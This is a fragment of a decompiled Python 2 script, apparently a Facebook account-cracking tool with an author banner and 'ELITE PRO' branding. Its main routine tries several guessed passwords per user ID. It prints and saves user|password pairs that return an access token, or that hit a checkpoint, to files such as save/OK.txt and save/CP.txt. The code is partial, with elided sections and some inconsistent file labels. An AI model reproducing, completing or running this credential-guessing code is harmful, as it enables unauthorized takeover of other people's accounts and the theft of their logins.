# Decompiled ARTS TEAM
# Github : https://github.com/ARST804
# uncompyle6 version 1.0
# Original written By ARTS TEAM
...
\x1b[1;96m\033[1;96mAuthor   :            ABDULLAH & SDJ
\x1b[1;96m\033[1;96mFacebook :         Abdullah & Rehan Khan
\x1b[1;96m\033[1;96mGitHub   :             AbdullahDada420
\x1b[1;96m\033[1;96mVersion  :              ELITE PRO
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;96m  [Abdullah_Temp_Lock]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m  [Abdullah_CP] ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [Abdullah_Temp_Lock] ' + k + c + user + '  |  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m  [Abdullah_CP] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/CP.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m  [Abdullah_Temp_Lock]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [Abdullah_CP] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/CP.txt', 'a')
